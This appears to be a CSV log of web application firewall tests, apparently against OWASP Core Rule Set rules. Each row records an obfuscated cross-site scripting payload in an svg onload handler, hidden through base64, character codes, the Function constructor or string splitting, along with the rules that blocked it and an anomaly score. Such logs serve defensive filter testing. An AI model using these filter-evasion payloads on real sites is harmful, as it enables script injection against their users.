3246,"<svg onload='this.remove();(function(){var a=atob(""YWxlcnQ"");window[a](1)})()'>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,79 || o67,10v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,79t:urlDecodeUni,t:compressWhitespace || ",35,177603668217.174601
3247,"<svg onload='this.remove();(function(){var a=[][""sort""][""constructor""](""return String"")()[""fromCharCode""](97,108,101,114,116);window[a](1)})()'>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,144 || o45,97v217,144t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,144 || v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o126,9v217,144t:urlDecodeUni,t:compressWhitespace || ",35,177603668445.871285
3248,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);self[a](1)})()'>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,101 || o89,10v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,7v217,101t:urlDecodeUni,t:compressWhitespace || ",35,177603668524.075873
3249,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);top[a](1)})()'>",0,1,block,9,"932100,932105,933210,934100,941100,941120,941160,941370,949110","o26,10v217,100 || o84,4v217,100 || o88,10v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,6v217,100t:urlDecodeUni,t:compressWhitespace || ",40,177603668767.610722
3250,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);parent[a](1)})()'>",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o26,10v217,103 || o91,10v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603668848.592328
3252,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);globalThis[a](1)})()'>",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o26,10v217,107 || o95,10v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603669127.245899
3253,"<svg onload='this.remove();(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1)})()'>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,109 || o97,10v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v217,109t:urlDecodeUni,t:compressWhitespace || ",35,177603669227.480090
3254,"<svg onload='this.remove();(function(){var a=`${String.fromCharCode(97,108,101,114,116)}`;window[a](1)})()'>",0,1,block,9,"932100,932130,933210,934100,941100,941120,941160,941370,949110","o26,10v217,108 || o44,57v217,108t:urlDecodeUni,t:cmdLine || o96,10v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,108t:urlDecodeUni,t:compressWhitespace || ",40,17760366943.067655
3255,"<svg onload='this.remove();(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1)})()'>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,104 || o92,10v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,9v217,104t:urlDecodeUni,t:compressWhitespace || ",35,177603669551.716587
3256,"<svg onload='this.remove();(function(){var a=String[""fromChar""+""Code""](97,108,101,114,116);window[a](1)})()'>",0,1,block,9,"932100,933210,934100,934100,941100,941120,941160,941370,949110","o26,10v217,109 || o51,56v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,109 || o28,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v217,109t:urlDecodeUni,t:compressWhitespace || ",40,177603669636.328951
3261,"<svg onload='this.remove();(function(){var a=decodeURI(""%61%6c%65%72%74"");window[a](1)})()'>",0,1,block,9,"932100,933210,934100,934100,941100,941120,941160,941370,949110","o26,10v217,92 || o70,10v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,92 || o28,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,92t:urlDecodeUni,t:compressWhitespace || ",40,177603670332.798887
3262,"<svg onload='this.remove();(function(){var a=unescape(""%61%6c%65%72%74"");window[a](1)})()'>",0,1,block,9,"932100,933210,934100,934100,941100,941120,941160,941370,949110","o26,10v217,91 || o69,10v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,91 || o28,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,9v217,91t:urlDecodeUni,t:compressWhitespace || ",40,177603670479.872334
3265,"<svg onload='this.remove();(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603670841.905601
3267,"<svg onload='this.remove();(function(){return(new Function(""al""+""ert(1)""))()})()'>",0,1,block,8,"932100,933210,934100,934100,941100,941120,941160,949110","o26,10v217,82 || o27,53v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,82 || o28,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603671112.931764
3268,<svg onload='this.remove();(new Function(`al`+`ert(1)`))()'>,0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,60 || o28,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603671290.609864
3269,"<svg onload='this.remove();(new Function(""a\154e\162t(1)""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603671487.219342
3271,"<svg onload='this.remove();(new Function(""a""+""l""+""e""+""r""+""t""+""(1)""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,72 || o28,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603671755.594838
3272,"<svg onload='this.remove();(new Function(atob(""YWxlcnQoMSk"")))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603671839.391784
3274,"<svg onload='this.remove();(new Function(""w""+""indow""+""[String.fromCharCode(97,108,101,114,116)](1)""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,105 || o28,13v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603672149.899744
3275,"<svg onload='this.remove();(new/**/ Function(""al""+""ert(1)""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603672227.922930
3276,"<svg onload='this.remove();(new Function(String[""fromCharCode""](97,108,101,114,116,40,49,41)))()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o27,69v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603672324.529074
3277,"<svg onload='this.remove();(new Function(""prompt(1)""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,58 || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603672480.204937
3278,"<svg onload='this.remove();(new Function(""confirm(1)""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,59 || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603672665.983439
3280,"<svg onload='this.remove();(new Function(""self""+""[String.fromCharCode(97,108,101,114,116)](1)""))()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,100 || o28,13v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603672811.438329
3281,"<svg onload='this.remove();(new Function([][""fill""][""constructor""](""al""+""ert(1)"")()))()'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o27,60v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,89 || o28,13v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603673091.613292
3283,"<svg onload='this.remove();(new Function([""a"",""l"",""e"",""r"",""t"",""(1)""].join("""")))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760367320.216841
3301,<svg onload=Function(atob('YWxlcnQoMSk'))()>,0,1,block,4,"941100,941120,941160,949110","v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603675770.112438
3303,<svg onload=Function['prototype']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o20,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603675985.174338
3306,<svg onload=(top.Function)('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o12,31v216,44t:urlDecode,t:replaceComments,t:compressWhitespace || v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760367635.544592
3310,<svg onload=Function.constructor.constructor('al'+'ert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603676820.291284
3313,<svg onload=(new/**/Function('al'+'ert(1)'))()>,0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760367728.069450
3314,<svg onload=Function['const'+'ructor']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o20,35v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760367738.726579
3320,"<svg onload=(1,Function)('al'+'ert(1)')()>",0,1,block,4,"941100,941120,941160,949110","v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603678146.362038
3321,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603678215.504312
3384,<svg onload=Function(atob`YWxlcnQoMSk=`)()>,0,1,block,4,"941100,941120,941160,949110","v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760368693.992109
3387,<svg onload=window['Function']['constructor']('return\x20this')()['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o18,83v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,18v217,102t:urlDecodeUni,t:compressWhitespace || ",25,17760368732.163417
3403,<svg/onload=Function(atob(/YWxlcnQoMSk=/.source))()>,0,1,block,4,"941100,941120,941160,949110","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603689418.786783
3423,<svg onload=Function('ale'+'rt(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603692297.331663
3430,<svg onload=self['Function']('ale\u0072t(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,31v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v216,48t:urlDecodeUni,t:compressWhitespace || ",25,177603693380.153706
3433,<svg onload=top['Function']('retur'+'n\x20ale'+'rt')()('1')>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o15,44v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,60t:urlDecodeUni,t:compressWhitespace || ",25,177603693630.659749
3447,<svg onload=Function('al'+'ert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603695525.937850
3452,<svg onload=new/**/Function('al'+'ert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603696212.375649
3470,<svg onload=(function(){top['al'+'ert'](1)})()>,0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o21,6v216,47 || o12,34v216,47t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v216,47 || o13,11v216,47t:urlDecodeUni || v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v216,47t:urlDecodeUni,t:compressWhitespace || ",40,177603698784.699621
3477,"<svg onload=(function(){self[String.fromCharCode(97,108,101,114,116)](1)})()>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o13,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,45v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603699715.550737
3480,<svg onload=(function(){window[['ale'+'rt'][0]](1)})()>,0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o12,42v217,55t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,55 || o13,11v217,55t:urlDecodeUni || v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,19v217,55t:urlDecodeUni,t:compressWhitespace || ",35,177603700124.003671
3483,"<svg onload=(function(){window[/ale/.source+String.fromCharCode(114,116)](1)})()>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o13,11v217,81 || o13,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,49v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603700585.823063
